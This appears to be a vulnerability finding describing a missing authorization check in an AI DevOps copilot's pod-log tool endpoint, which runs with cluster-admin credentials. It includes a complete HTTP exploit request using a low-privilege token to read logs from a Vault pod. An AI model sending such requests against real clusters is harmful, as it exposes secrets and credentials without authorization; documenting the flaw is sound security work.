diagnosis: The DevOps AI copilot tool endpoint retrieves Kubernetes container logs using namespace and podName parameters provided in the tool call. The backend executes the API call with cluster-admin service credentials and neglects to check whether the developer is authorized to view pods in the target namespace. A developer permitted only in the 'dev-sandbox' namespace can inspect logs from 'kube-system' or 'vault-production', exposing root secrets and cluster credentials.
exploit_request:
POST /api/ai/tools/get-pod-logs HTTP/1.1
Host: devops-ai.infra.company.com:8114
Authorization: Bearer <intern_dev_token>
Content-Type: application/json

{"parameters": {"namespace": "production-vault", "podName": "vault-0", "containerName": "vault"}}
